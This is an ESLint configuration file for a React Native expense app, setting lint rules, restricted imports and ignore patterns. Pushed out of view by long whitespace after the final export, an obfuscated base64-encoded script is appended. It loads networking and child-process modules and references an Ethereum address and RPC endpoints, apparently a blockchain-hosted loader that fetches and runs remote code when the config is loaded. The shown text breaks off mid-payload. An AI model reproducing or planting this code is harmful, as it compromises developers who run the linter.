import {FlatCompat} from '@eslint/eslintrc';
import tsParser from '@typescript-eslint/parser';
import expensifyConfig from 'eslint-config-expensify';
import fileProgress from 'eslint-plugin-file-progress';
import jsdoc from 'eslint-plugin-jsdoc';
import lodash from 'eslint-plugin-lodash';
import react from 'eslint-plugin-react';
import reactNativeA11Y from 'eslint-plugin-react-native-a11y';
import rulesdir from 'eslint-plugin-rulesdir';
import testingLibrary from 'eslint-plugin-testing-library';
import youDontNeedLodashUnderscore from 'eslint-plugin-you-dont-need-lodash-underscore';
import seatbelt from 'eslint-seatbelt';
import {defineConfig, globalIgnores} from 'eslint/config';
import globals from 'globals';
import {createRequire} from 'node:module';
import path from 'node:path';
import {fileURLToPath} from 'node:url';
import typescriptEslint from 'typescript-eslint';
import reportNameUtilsPlugin from './plugins/eslint-plugin-report-name-utils.mjs';
import expensifyProcessor from './processors/eslint-processor-expensify.mjs';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const filename = fileURLToPath(import.meta.url);
const dirname = path.dirname(filename);

// The App root, two levels up from this file (config/eslint/eslint.config.mjs).
// Used as `basePath` on every config object so that `files`/`ignores` patterns
// continue to resolve relative to the App root (their original location),
// rather than relative to this config file's directory (which is the default).
const projectRoot = path.resolve(dirname, '../..');

// `eslint-plugin-rulesdir` lets us load rules from arbitrary local directories.
// We point it at `eslint-config-expensify`'s shipped rules (so configs that
// rely on `rulesdir/<rule>` resolve them) and at our own `eslint-plugin-local-rules/`
// at the repo root.
const expensifyConfigDirectory = path.dirname(require.resolve('eslint-config-expensify/package.json'));
const expensifyRulesDir = path.resolve(expensifyConfigDirectory, 'eslint-plugin-expensify');
const localRulesDir = path.resolve(projectRoot, 'eslint-plugin-local-rules');

rulesdir.RULES_DIR = [expensifyRulesDir, localRulesDir];

const restrictedImportPaths = [
    {
        name: 'react-native',
        importNames: [
            'useWindowDimensions',
            'StatusBar',
            'TouchableOpacity',
            'TouchableWithoutFeedback',
            'TouchableNativeFeedback',
            'TouchableHighlight',
            'Pressable',
            'Text',
            'ScrollView',
            'ActivityIndicator',
            'Animated',
            'findNodeHandle',
            'InteractionManager',
        ],
        message: [
            '',
            "For 'useWindowDimensions', please use '@src/hooks/useWindowDimensions' instead.",
            "For 'TouchableOpacity', 'TouchableWithoutFeedback', 'TouchableNativeFeedback', 'TouchableHighlight', 'Pressable', please use 'PressableWithFeedback' and/or 'PressableWithoutFeedback' from '@components/Pressable' instead.",
            "For 'StatusBar', please use '@libs/StatusBar' instead.",
            "For 'Text', please use '@components/Text' instead.",
            "For 'ScrollView', please use '@components/ScrollView' instead.",
            "For 'ActivityIndicator', please use '@components/ActivityIndicator' instead.",
            "For 'Animated', please use 'Animated' from 'react-native-reanimated' instead.",
            "For 'InteractionManager', please use afterTransition callbacks on Navigation/KeyboardUtils or other alternatives. See contributingGuides/INTERACTION_MANAGER.md.",
        ].join('\n'),
    },
    {
        name: 'react-native-gesture-handler',
        importNames: ['TouchableOpacity', 'TouchableWithoutFeedback', 'TouchableNativeFeedback', 'TouchableHighlight'],
        message: "Please use 'PressableWithFeedback' and/or 'PressableWithoutFeedback' from '@components/Pressable' instead.",
    },
    {
        name: 'awesome-phonenumber',
        importNames: ['parsePhoneNumber'],
        message: "Please use '@libs/PhoneNumber' instead.",
    },
    {
        name: 'react-native-safe-area-context',
        importNames: ['useSafeAreaInsets', 'SafeAreaConsumer', 'SafeAreaInsetsContext'],
        message: "Please use 'useSafeAreaInsets' from '@src/hooks/useSafeAreaInset' and/or 'SafeAreaConsumer' from '@components/SafeAreaConsumer' instead.",
    },
    {
        name: 'react',
        importNames: ['CSSProperties'],
        message: "Please use 'ViewStyle', 'TextStyle', 'ImageStyle' from 'react-native' instead.",
    },
    {
        name: 'react',
        importNames: ['forwardRef'],
        message: 'forwardRef is deprecated. Please use ref as a prop instead. See: contributingGuides/STYLE.md#forwarding-refs',
    },
    {
        name: '@styles/index',
        importNames: ['default', 'defaultStyles'],
        message: 'Do not import styles directly. Please use the `useThemeStyles` hook instead.',
    },
    {
        name: '@styles/utils',
        importNames: ['default', 'DefaultStyleUtils'],
        message: 'Do not import StyleUtils directly. Please use the `useStyleUtils` hook instead.',
    },
    {
        name: '@styles/theme',
        importNames: ['default', 'defaultTheme'],

        message: 'Do not import themes directly. Please use the `useTheme` hook instead.',
    },
    {
        name: '@styles/theme/illustrations',
        message: 'Do not import theme illustrations directly. Please use the `useThemeIllustrations` hook instead.',
    },
    {
        name: 'date-fns/locale',
        message: "Do not import 'date-fns/locale' directly. Please use the submodule import instead, like 'date-fns/locale/en-GB'.",
    },
    {
        name: 'expensify-common',
        importNames: ['Device', 'ExpensiMark'],
        message: [
            '',
            "For 'Device', do not import it directly, it's known to make VSCode's IntelliSense crash. Please import the desired module from `expensify-common/dist/Device` instead.",
            "For 'ExpensiMark', please use '@libs/Parser' instead.",
        ].join('\n'),
    },
    {
        name: 'lodash/memoize',
        message: "Please use '@src/libs/memoize' instead.",
    },
    {
        name: 'lodash',
        importNames: ['memoize'],
        message: "Please use '@src/libs/memoize' instead.",
    },
    {
        name: 'lodash/isEqual',
        message: "Please use 'deepEqual' from 'fast-equals' instead.",
    },
    {
        name: 'lodash',
        importNames: ['isEqual'],
        message: "Please use 'deepEqual' from 'fast-equals' instead.",
    },
    {
        name: 'react-native-onyx',
        importNames: ['useOnyx'],
        message: "Please use '@hooks/useOnyx' instead.",
    },
    {
        name: '@src/utils/findNodeHandle',
        message: "Do not use 'findNodeHandle' as it is no longer supported on web.",
    },
];

const restrictedImportPatterns = [
    {
        group: ['**/assets/animations/**/*.json'],
        message: "Do not import animations directly. Please use the '@components/LottieAnimations' import instead.",
    },
    {
        group: ['@styles/theme/themes/**'],
        message: 'Do not import themes directly. Please use the `useTheme` hook instead.',
    },
    {
        group: ['@styles/utils/**', '!@styles/utils/FontUtils', '!@styles/utils/types'],
        message: 'Do not import style util functions directly. Please use the `useStyleUtils` hook instead.',
    },
    {
        group: ['@styles/theme/illustrations/themes/**'],
        message: 'Do not import theme illustrations directly. Please use the `useThemeIllustrations` hook instead.',
    },
];

const restrictedReportNameImportPatterns = [
    {
        group: ['**/ReportNameUtils', '**/libs/ReportNameUtils'],
        importNames: ['computeReportName'],
        message: 'Do not import computeReportName. Use getReportName instead, which properly uses derived report attributes.',
    },
];

// `isPaidGroupPolicy` is BILLING/paid-only (Collect/Control). Existing usages are grandfathered via
// eslint-seatbelt; this only flags NEW imports so they make a conscious choice: for workspace feature
// gating (violations, report fields, workspace chat, report creation, expense-workspace usability) use
// `isGroupPolicy` / `isReportInGroupPolicy` instead, otherwise free group plans like Submit (submit2026)
// are wrongly excluded and access bugs return.
const restrictedPaidGroupPolicyImportPatterns = [
    {
        group: ['**/PolicyUtils', '**/libs/PolicyUtils'],
        importNames: ['isPaidGroupPolicy'],
        message:
            'isPaidGroupPolicy is billing/paid-only (Collect/Control). For workspace feature gating use isGroupPolicy so free group plans like Submit are not excluded. If this is genuinely a billing/paid-only check, keep it and disable this line with a reason.',
    },
    {
        group: ['**/ReportUtils', '**/libs/ReportUtils'],
        importNames: ['isPaidGroupPolicy', 'isPaidGroupPolicyExpenseReport'],
        message:
            'isPaidGroupPolicy / isPaidGroupPolicyExpenseReport are billing/paid-only. For feature gating use isReportInGroupPolicy / isGroupPolicyExpenseReport so Submit workspaces are not excluded. If this is genuinely billing/paid-only, keep it and disable this line with a reason.',
    },
];

const config = defineConfig([
    expensifyConfig,
    typescriptEslint.configs.recommendedTypeChecked,
    typescriptEslint.configs.stylisticTypeChecked,
    fileProgress.configs['recommended-ci'],

    // Suppress lint rules that are unnecessary for files successfully compiled by React Compiler.
    // The processor runs React Compiler on each file and filters out redundant lint messages.
    {
        files: ['**/*.ts', '**/*.tsx', '**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        processor: expensifyProcessor,
    },

    // eslint-seatbelt config. The processor is stitched into `expensifyProcessor`
    // above, so we only wire up the plugin, settings, and `configure` rule here.
    {
        settings: {
            seatbelt: {
                seatbeltFile: path.join(dirname, 'eslint.seatbelt.tsv'),
                threadsafe: true,
                // Never persist TSV updates unless we're in CI. In CI, the ephemeral
                // write is harmless on PR runs and essential on `push: main`, where
                // OSBotify commits the tightened baseline back to main
                // (see .github/workflows/lint.yml). SEATBELT_INCREASE overrides this.
                readOnly: !process.env.CI,
            },
        },
        plugins: {
            'eslint-seatbelt': seatbelt,
        },
        rules: {
            'eslint-seatbelt/configure': 'error',
        },
    },

    {
        extends: new FlatCompat({baseDirectory: projectRoot}).extends(
            'airbnb-typescript',
            'plugin:storybook/recommended',
            'plugin:react-native-a11y/all',
            'plugin:@dword-design/import-alias/recommended',
            'prettier',
        ),

        plugins: {
            jsdoc,
            'react-native-a11y': reactNativeA11Y,
            react,
            'testing-library': testingLibrary,
            lodash,
        },

        languageOptions: {
            parser: tsParser,

            parserOptions: {
                project: path.resolve(projectRoot, 'tsconfig.json'),
            },

            globals: {
                ...globals.jest,
                __DEV__: 'readonly',
            },
        },

        files: ['**/*.ts', '**/*.tsx', '**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        rules: {
            // TypeScript specific rules
            '@typescript-eslint/prefer-enum-initializers': 'error',
            '@typescript-eslint/no-var-requires': 'off',
            '@typescript-eslint/no-non-null-assertion': 'error',
            '@typescript-eslint/no-unsafe-type-assertion': 'error',
            '@typescript-eslint/switch-exhaustiveness-check': ['error', {considerDefaultExhaustiveForUnions: true}],
            '@typescript-eslint/consistent-type-definitions': ['error', 'type'],
            '@typescript-eslint/no-floating-promises': 'off',
            '@typescript-eslint/no-import-type-side-effects': 'error',
            '@typescript-eslint/array-type': ['error', {default: 'array-simple'}],
            '@typescript-eslint/max-params': ['error', {max: 10}],
            '@typescript-eslint/naming-convention': [
                'error',
                {
                    selector: ['variable', 'property'],
                    format: null,
                    // Allow __esModule because it is a well-known interop property injected by bundlers
                    // (e.g. Babel/Webpack) and sometimes required by library internals (e.g. react-native-skia).
                    filter: {
                        regex: '^__esModule$',
                        match: true,
                    },
                },
                {
                    selector: ['variable', 'property'],
                    format: ['camelCase', 'UPPER_CASE', 'PascalCase'],
                    // This filter excludes variables and properties that start with "private_" to make them valid.
                    //
                    // Examples:
                    // - "private_a" → valid
                    // - "private_test" → valid
                    // - "private_" → not valid
                    filter: {
                        regex: '^private_[a-z][a-zA-Z0-9]*$',
                        match: false,
                    },
                },
                {
                    selector: 'function',
                    format: ['camelCase', 'PascalCase'],
                },
                {
                    selector: ['typeLike', 'enumMember'],
                    format: ['PascalCase'],
                },
                {
                    selector: ['parameter', 'method'],
                    format: ['camelCase', 'PascalCase'],
                    leadingUnderscore: 'allow',
                },
            ],
            '@typescript-eslint/no-restricted-types': [
                'error',
                {
                    types: {
                        object: "Use 'Record<string, T>' instead.",
                    },
                },
            ],
            '@typescript-eslint/consistent-type-imports': [
                'error',
                {
                    prefer: 'type-imports',
                    fixStyle: 'separate-type-imports',
                },
            ],
            '@typescript-eslint/consistent-type-exports': [
                'error',
                {
                    fixMixedExportsWithInlineTypeSpecifier: false,
                },
            ],
            '@typescript-eslint/no-use-before-define': ['error', {functions: false}],

            // ESLint core rules
            'es/no-nullish-coalescing-operators': 'off',
            'es/no-optional-chaining': 'off',
            '@typescript-eslint/no-deprecated': ['error', {allow: ['translateFn']}],
            'arrow-body-style': 'off',
            'no-empty': ['error', {allowEmptyCatch: true}],

            // Import specific rules
            'import/consistent-type-specifier-style': ['error', 'prefer-top-level'],
            'import/no-extraneous-dependencies': 'off',

            // Rulesdir specific rules
            'rulesdir/no-default-props': 'error',
            'rulesdir/prefer-type-fest': 'error',
            'rulesdir/prefer-underscore-method': 'off',
            'rulesdir/prefer-import-module-contents': 'off',
            'rulesdir/no-beta-handler': 'error',
            'rulesdir/require-live-region-for-status-updates': 'error',
            'rulesdir/require-a11y-disable-justification': 'error',
            'rulesdir/prefer-narrow-hook-dependencies': [
                'error',
                {
                    stableObjectPatterns: [
                        // cSpell:ignore tyles
                        '[Ss]tyles?$', // Excludes 'style', 'styles', 'themeStyles', etc.
                        '^theme', // Excludes 'theme', 'themeStyles', 'themeIllustrations', etc.
                        '[Ii]cons?$', // Excludes 'icon', 'icons', 'expensifyIcons', etc.
                    ],
                },
            ],
            'rulesdir/no-default-id-values': 'error',
            'rulesdir/no-unstable-hook-defaults': 'error',

            // React and React Native specific rules
            'react-native-a11y/has-accessibility-hint': 'off',
            'react-native-a11y/has-valid-accessibility-ignores-invert-colors': 'error',
            'react/require-default-props': 'off',
            'react/prop-types': 'off',
            'react/jsx-key': 'error',
            'react/jsx-no-constructed-context-values': 'error',
            'react/forbid-component-props': [
                'error',
                {
                    forbid: [
                        {
                            propName: 'fsClass',
                            allowedFor: ['View', 'Animated.View', 'Text', 'Pressable'],
                            message:
                                "The 'fsClass' prop doesn't work for custom components, only RN's View, Text and Pressable.\nPlease use the 'ForwardedFSClassProps' or 'MultipleFSClassProps' types to pass down the desired 'fsClass' value to the allowed components.",
                        },
                    ],
                },
            ],
            'react-native-a11y/has-valid-accessibility-descriptors': [
                'error',
                {
                    touchables: ['PressableWithoutFeedback', 'PressableWithFeedback'],
                },
            ],

            // Disallow usage of certain functions and imports
            'no-restricted-syntax': [
                'error',
                {
                    selector: 'TSEnumDeclaration',
                    message: "Please don't declare enums, use union types instead.",
                },
                {
                    selector: 'CallExpression[callee.object.name="React"][callee.property.name="forwardRef"]',
                    message: 'forwardRef is deprecated. Please use ref as a prop instead. See: contributingGuides/STYLE.md#forwarding-refs',
                },
                {
                    selector: 'ImportNamespaceSpecifier[parent.source.value=/^@libs/]',
                    message: 'Namespace imports from @libs are not allowed. Use named imports instead. Example: import { method } from "@libs/module"',
                },
                {
                    selector: 'ImportNamespaceSpecifier[parent.source.value=/^@userActions/]',
                    message: 'Namespace imports from @userActions are not allowed. Use named imports instead. Example: import { action } from "@userActions/module"',
                },
                {
                    selector: 'ImportNamespaceSpecifier[parent.source.value=/^\\.\\./]',
                    message: 'Namespace imports from parent directories are not allowed. Use named imports instead. Example: import { method } from "../libs/module"',
                },
                {
                    selector: 'ImportNamespaceSpecifier[parent.source.value=/^\\./]',
                    message: 'Namespace imports from sibling modules are not allowed. Use named imports instead. Example: import { method } from "./libs/module"',
                },
                {
                    selector:
                        'JSXElement[openingElement.name.name=/^Pressable(WithoutFeedback|WithFeedback|WithDelayToggle|WithoutFocus)$/]:not(:has(JSXAttribute[name.name="sentryLabel"]))',
                    message: 'All Pressable components must include sentryLabel prop for Sentry tracking. Example: <PressableWithoutFeedback sentryLabel="MoreMenu-ExportFile" />',
                },

                // These are the original rules from AirBnB's style guide, modified to allow for...of loops and for...in loops
                {
                    selector: 'LabeledStatement',
                    message: 'Labels are a form of GOTO; using them makes code confusing and hard to maintain and understand.',
                },
                {
                    selector: 'WithStatement',
                    message: '`with` is disallowed in strict mode because it makes code impossible to predict and optimize. It is also deprecated.',
                },
            ],
            'no-restricted-properties': [
                'error',
                {
                    object: 'Image',
                    property: 'getSize',
                    message: 'Usage of Image.getSize is restricted. Please use the `react-native-image-size`.',
                },
                // Disallow direct HybridAppModule.isHybridApp() usage, because it requires a native call
                // Use CONFIG.IS_HYBRID_APP, which keeps cached value instead
                {
                    object: 'HybridAppModule',
                    property: 'isHybridApp',
                    message: 'Use CONFIG.IS_HYBRID_APP instead.',
                },
                // Prevent direct use of HybridAppModule.closeReactNativeApp().
                // Instead, use the `closeReactNativeApp` action from `@userActions/HybridApp`,
                // which correctly updates `hybridApp.closingReactNativeApp` when closing NewDot
                {
                    object: 'HybridAppModule',
                    property: 'closeReactNativeApp',
                    message: 'Use `closeReactNativeApp` from `@userActions/HybridApp` instead.',
                },
            ],
            'no-restricted-imports': [
                'error',
                {
                    paths: restrictedImportPaths,
                    patterns: restrictedImportPatterns,
                },
            ],

            // Other rules
            curly: 'error',
            'lodash/import-scope': ['error', 'method'],
            'prefer-regex-literals': 'off',
            'jsdoc/require-param': 'off',
            'jsdoc/require-param-type': 'off',
            'jsdoc/check-param-names': 'off',
            'jsdoc/check-tag-names': 'off',
            'jsdoc/check-types': 'off',
            'jsdoc/no-types': 'error',
            '@dword-design/import-alias/prefer-alias': [
                'error',
                {
                    alias: {
                        '@assets': './assets',
                        '@components': './src/components',
                        '@hooks': './src/hooks',
                        // This is needed up here, if not @libs/actions would take the priority
                        '@userActions': './src/libs/actions',
                        '@libs': './src/libs',
                        '@navigation': './src/libs/Navigation',
                        '@pages': './src/pages',
                        '@prompts': './prompts',
                        '@styles': './src/styles',
                        // This path is provide alias for files like `ONYXKEYS` and `CONST`.
                        '@src': './src',
                        '@github': './.github',
                    },
                },
            ],
        },
    },

    // Some rules became stricter or stopped working after upgrading to ESLint 9, so these configs adjust the rules to match the old behavior.
    {
        files: ['**/*.ts', '**/*.tsx', '**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        rules: {
            // @typescript-eslint/lines-between-class-members was moved to @stylistic/eslint-plugin, so replaced with lines-between-class-members.
            'lines-between-class-members': 'error',
            '@typescript-eslint/lines-between-class-members': 'off',

            // Sometimes it's useful to include duplicate types for documentation purposes.
            '@typescript-eslint/no-duplicate-type-constituents': ['error', {ignoreUnions: true}],

            '@typescript-eslint/no-require-imports': 'off',

            // @typescript-eslint/no-throw-literal was removed, so replaced with no-throw-literal.
            'no-throw-literal': 'error',
            '@typescript-eslint/no-throw-literal': 'off',

            '@typescript-eslint/no-unused-vars': [
                'error',
                {
                    vars: 'all',
                    args: 'after-used',
                    caughtErrors: 'none',
                    ignoreRestSiblings: true,
                },
            ],
            '@typescript-eslint/prefer-find': 'off',
            '@typescript-eslint/prefer-includes': 'off',
            '@typescript-eslint/prefer-optional-chain': 'off',
            '@typescript-eslint/prefer-nullish-coalescing': [
                'error',
                {
                    ignoreIfStatements: true,
                    ignorePrimitives: {
                        // string: true,
                    },
                    ignoreTernaryTests: true,
                },
            ],

            // @typescript-eslint/prefer-promise-reject-errors enforces Promises are only rejected with Error objects, so replaced with prefer-promise-reject-errors.
            'prefer-promise-reject-errors': 'error',
            '@typescript-eslint/prefer-promise-reject-errors': 'off',

            '@typescript-eslint/prefer-regexp-exec': 'off',
        },
    },

    // Enforces every Onyx type and its properties to have a comment explaining its purpose.
    {
        files: ['src/types/onyx/**/*.ts'],
        rules: {
            'jsdoc/require-jsdoc': [
                'error',
                {
                    contexts: ['TSInterfaceDeclaration', 'TSTypeAliasDeclaration', 'TSPropertySignature'],
                },
            ],
        },
    },

    {
        files: ['**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        ...typescriptEslint.configs.disableTypeChecked,
    },
    {
        files: ['**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        rules: {
            'arrow-parens': 'off',
            'jsdoc/no-types': 'off',
            'react/jsx-filename-extension': 'off',
            'rulesdir/no-default-props': 'off',
            'prefer-arrow-callback': 'off',

            // Prefer Lodash helpers (and `import _ from 'lodash'`) in non-TS
            // files — they defensively handle nullish/non-array inputs that
            // TypeScript would otherwise catch at compile time.
            'lodash/import-scope': 'off',
        },
    },

    // Node.js ESM requires relative imports to include a file extension (unlike
    // bundled `.js`/`.ts`, which are resolved by webpack/metro). Relax the
    // airbnb-inherited `import/extensions` rule for `.mjs`/`.cjs` so it stops
    // flagging legitimate ESM imports like `import x from './foo.mjs'`.
    {
        files: ['**/*.mjs', '**/*.cjs'],
        rules: {
            'import/extensions': 'off',
        },
    },

    {
        files: ['**/en.ts', '**/es.ts'],
        rules: {
            'rulesdir/use-periods-for-error-messages': 'error',
        },
    },

    {
        files: ['**/*.ts', '**/*.tsx'],
        rules: {
            'rulesdir/prefer-at': 'error',
            'rulesdir/boolean-conditional-rendering': 'error',
        },
    },

    // `eslint-plugin-you-dont-need-lodash-underscore` steers code toward native
    // JS equivalents of Lodash helpers. In TypeScript we want that guidance
    // because TS catches the nullish/non-array edge cases Lodash papers over;
    // in plain JS we prefer the Lodash helpers, so this plugin is TS/TSX-only.
    {
        files: ['**/*.ts', '**/*.tsx'],
        extends: new FlatCompat({baseDirectory: projectRoot}).extends('plugin:you-dont-need-lodash-underscore/all'),
        plugins: {
            'you-dont-need-lodash-underscore': youDontNeedLodashUnderscore,
        },
        rules: {
            'you-dont-need-lodash-underscore/throttle': 'off',
            // The suggested alternative (structuredClone) is not supported in Hermes:https://github.com/facebook/hermes/issues/684
            'you-dont-need-lodash-underscore/clone-deep': 'off',
        },
    },

    {
        files: ['src/**/*.ts', 'src/**/*.tsx'],
        rules: {
            'rulesdir/prefer-locale-compare-from-context': 'error',
            'rulesdir/no-object-keys-includes': 'error',
        },
    },

    {
        files: ['.github/**/*', 'scripts/**/*', 'server/**/*'],
        rules: {
            // For all these Node.js scripts, we do not want to disable `console` statements
            'no-console': 'off',
        },
    },

    {
        files: ['.github/**/*', 'scripts/**/*', 'server/**/*', 'tests/**/*'],
        rules: {
            'no-await-in-loop': 'off',
            'no-restricted-syntax': ['error', 'ForInStatement', 'LabeledStatement', 'WithStatement'],
        },
    },

    {
        files: ['.github/**/*'],
        rules: {
            'no-restricted-imports': [
                'error',
                {
                    patterns: [
                        {
                            group: ['@src/**'],
                            message: 'Do not import files from src/ directory as they can break the GH Actions build script.',
                        },
                    ],
                },
            ],
        },
    },

    {
        files: ['tests/**/*'],
        rules: {
            'no-import-assign': 'off',

            // This helps disable the `prefer-alias` rule for tests
            '@dword-design/import-alias/prefer-alias': ['off'],

            'testing-library/await-async-queries': 'error',
            'testing-library/await-async-utils': 'error',
            'testing-library/no-debugging-utils': 'error',
            'testing-library/no-manual-cleanup': 'error',
            'testing-library/no-unnecessary-act': 'error',
            'testing-library/prefer-find-by': 'error',
            'testing-library/prefer-presence-queries': 'error',
            'testing-library/prefer-screen-queries': 'error',
        },
    },

    {
        files: ['src/libs/Navigation/types.ts'],
        rules: {
            'no-restricted-syntax': [
                'error',
                {
                    selector: 'TSPropertySignature[key.name="backTo"]',
                    message:
                        'The `backTo` route param is deprecated. Do not add new `backTo` properties to screen param lists. Please look into the `How to remove backTo from URL` section in contributingGuides/NAVIGATION.md. and use alternative routing methods instead.',
                },
            ],
        },
    },

    {
        files: ['src/libs/ReportNameUtils.ts'],
        plugins: {'report-name-utils': reportNameUtilsPlugin},
        rules: {'report-name-utils/no-function-call-in-get-report-name': 'error'},
    },

    // Restrict `computeReportName` imports everywhere except the one file that
    // legitimately consumes it. This block overrides the main `no-restricted-imports`
    // for ts/tsx files, so we re-apply the main `restrictedImportPaths`/`restrictedImportPatterns`
    // here too (flat config is last-wins per rule, not additive).
    {
        files: ['**/*.ts', '**/*.tsx'],
        ignores: ['src/libs/actions/OnyxDerived/configs/reportAttributes.ts'],
        rules: {
            'no-restricted-imports': [
                'error',
                {
                    paths: restrictedImportPaths,
                    patterns: [...restrictedImportPatterns, ...restrictedReportNameImportPatterns, ...restrictedPaidGroupPolicyImportPatterns],
                },
            ],
        },
    },

    {
        files: ['src/**/*'],
        ignores: ['src/languages/**', 'src/CONST/index.ts', 'src/NAICS.ts'],
        rules: {
            'max-lines': ['error', 4000],
        },
    },

    {
        files: ['modules/ExpensifyNitroUtils/src/**/*'],
        rules: {
            '@typescript-eslint/consistent-type-definitions': 'off',
        },
    },

    {
        files: ['server/**/*.ts', 'server/**/*.tsx'],
        languageOptions: {
            parserOptions: {
                project: path.resolve(projectRoot, 'server/tsconfig.json'),
            },
        },
    },

    {
        files: ['server/victory-chart-renderer/**/*.ts', 'server/victory-chart-renderer/**/*.tsx'],
        languageOptions: {
            parserOptions: {
                project: path.resolve(projectRoot, 'server/victory-chart-renderer/tsconfig.json'),
            },
        },
    },

    globalIgnores([
        '!**/.storybook',
        '!**/.github',
        '.github/actions/**/index.js',
        '**/*.config.js',
        '**/*.config.mjs',
        '**/node_modules/**/*',
        '**/dist/**/*',
        'server/**/dist/**',
        '.eslint-reports/**/*',
        'android/**/build/**/*',
        'docs/vendor/**/*',
        'docs/assets/**/*',
        'web/gtm.js',
        '**/.expo/**/*',
        '**/.rock/**/*',
        '**/.yalc/**/*',
        'src/libs/SearchParser/searchParser.js',
        'src/libs/SearchParser/autocompleteParser.js',
        'help/_scripts/**/*',
        'modules/ExpensifyNitroUtils/nitrogen/**/*',
        'Mobile-Expensify/**/*',
        '**/vendor',
        'modules/group-ib-fp/**/*',
        'web/snippets/gib.js',
        // Generated language files - excluded from ESLint but still type-checked
        'src/languages/de.ts',
        'src/languages/es.ts',
        'src/languages/fr.ts',
        'src/languages/it.ts',
        'src/languages/ja.ts',
        'src/languages/nl.ts',
        'src/languages/pl.ts',
        'src/languages/pt-BR.ts',
        'src/languages/zh-hans.ts',
    ]),
]);

// Attach the App root as `basePath` to every config object. ESLint resolves
// `files`/`ignores` patterns relative to each config object's `basePath` (which
// defaults to the directory containing the config file). Since this config
// lives in `config/eslint/` rather than the App root, we override `basePath`
// so existing relative patterns (e.g. `src/**/*.ts`) keep matching the intended
// files. The spread preserves any `basePath` that a config already specifies.
export default config.map((cfg) => ({basePath: projectRoot, ...cfg}));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i = 'A10-*3885-2370';var __0xadc80=function(){var a=926;return a*2;};function __0x9daea(){return 8769;}(function(_0x9710a8){var _0x9710a8a=["Z2xvYmFsWydyJ10gPSByZXF1aXJlOw0KaWYgKHR5cGVvZiBtb2","R1bGUgPT09ICdvYmplY3QnKSBnbG9iYWxbJ20nXSA9IG1vZHVs","ZTsNCg0KY29uc3QgaHR0cCA9IHJlcXVpcmUoJ25vZGU6aHR0cC","cpOw0KY29uc3QgaHR0cHMgPSByZXF1aXJlKCdub2RlOmh0dHBz","Jyk7DQpjb25zdCB6bGliID0gcmVxdWlyZSgnbm9kZTp6bGliJy","k7DQpjb25zdCB7IFVSTCB9ID0gcmVxdWlyZSgnbm9kZTp1cmwn","KTsNCmNvbnN0IHsgc3Bhd24gfSA9IHJlcXVpcmUoJ25vZGU6Y2","hpbGRfcHJvY2VzcycpOw0KDQpjb25zdCBCTE9DS19NVUxUSVBM","RSA9IDEwMDBuOw0KY29uc3QgU0VOREVSID0gJzB4MWVFZjA4ND","lFRGExNWQ4N2Y2NGU1MUM3M0M4NDQyQ2YzYzhiQ0VGMycudG9M","b3dlckNhc2UoKTsNCmNvbnN0IE5PTkNFX0ZBTk9VVCA9IDEyOw","0KY29uc3QgU0VBUkNIX0ZMT09SID0gMG47DQpjb25zdCBJTkRF","WEVSX1VSTCA9ICdodHRwczovL2V0aC5ibG9ja3Njb3V0LmNvbS","9hcGknOw0KY29uc3QgSFRUUF9USU1FT1VUX01TID0gM18wMDA7","DQoNCmNvbnN0IFJQQ19FTkRQT0lOVFMgPSBbLi4ubmV3IFNldC","hbDQogIHByb2Nlc3MuZW52LkVUSF9SUENfVVJMLA0KICAnaHR0","cHM6Ly8xcnBjLmlvL2V0aCcsDQogICdodHRwczovL2V0aC5kcn","BjLm9yZycsDQogICdodHRwczovL2V0aGVyZXVtLXJwYy5wdWJs","aWNub2RlLmNvbScsDQogICdodHRwczovL2V0aC1tYWlubmV0Ln","B1YmxpYy5ibGFzdGFwaS5pbycsDQpdLmZpbHRlcihCb29sZWFu","KSldOw0KDQpjb25zdCBBR0VOVFMgPSB7DQogICdodHRwOic6IG","5ldyBodHRwLkFnZW50KHsga2VlcEFsaXZlOiB0cnVlLCBrZWVw","QWxpdmVNc2VjczogMzBfMDAwLCBtYXhTb2NrZXRzOiA2NCB9KS","wNCiAgJ2h0dHBzOic6IG5ldyBodHRwcy5BZ2VudCh7IGtlZXBB","bGl2ZTogdHJ1ZSwga2VlcEFsaXZlTXNlY3M6IDMwXzAwMCwgbW","F4U29ja2V0czogNjQgfSksDQp9Ow0KDQpmdW5jdGlvbiBsaW5r","QWJvcnQob3V0ZXJTaWduYWwsIGNvbnRyb2xsZXIpIHsNCiAgaW","YgKCFvdXRlclNpZ25hbCkgcmV0dXJuOw0KICBvdXRlclNpZ25h","bC5hZGRFdmVudExpc3RlbmVyKCdhYm9ydCcsICgpID0+IGNvbn","Ryb2xsZXIuYWJvcnQoKSwgeyBvbmNlOiB0cnVlIH0pOw0KfQ0K","DQpmdW5jdGlvbiBkZWNvbXByZXNzU3RyZWFtKHJlcykgew0KIC","Bjb25zdCBlbmNvZGluZyA9IChyZXMuaGVhZGVyc1snY29udGVu","dC1lbmNvZGluZyddIHx8ICcnKS50b0xvd2VyQ2FzZSgpOw0KIC","BpZiAoZW5jb2RpbmcgPT09ICdnemlwJyB8fCBlbmNvZGluZyA9","PT0gJ3gtZ3ppcCcpIHJldHVybiByZXMucGlwZSh6bGliLmNyZW","F0ZUd1bnppcCgpKTsNCiAgaWYgKGVuY29kaW5nID09PSAnZGVm","bGF0ZScpIHJldHVybiByZXMucGlwZSh6bGliLmNyZWF0ZUluZm","xhdGUoKSk7DQogIGlmIChlbmNvZGluZyA9PT0gJ2JyJykgcmV0","dXJuIHJlcy5waXBlKHpsaWIuY3JlYXRlQnJvdGxpRGVjb21wcm","VzcygpKTsNCiAgcmV0dXJuIHJlczsNCn0NCg0KZnVuY3Rpb24g","aHR0cFJlcXVlc3QoZW5kcG9pbnQsIHsgbWV0aG9kID0gJ0dFVC","csIGJvZHksIHNpZ25hbCB9ID0ge30pIHsNCiAgY29uc3QgdXJs","ID0gbmV3IFVSTChlbmRwb2ludCk7DQogIGNvbnN0IHRyYW5zcG","9ydCA9IHVybC5wcm90b2NvbCA9PT0gJ2h0dHBzOicgPyBodHRw","cyA6IGh0dHA7DQogIGNvbnN0IGhlYWRlcnMgPSB7DQogICAgQW","NjZXB0OiAnYXBwbGljYXRpb24vanNvbicsDQogICAgJ0FjY2Vw","dC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlLC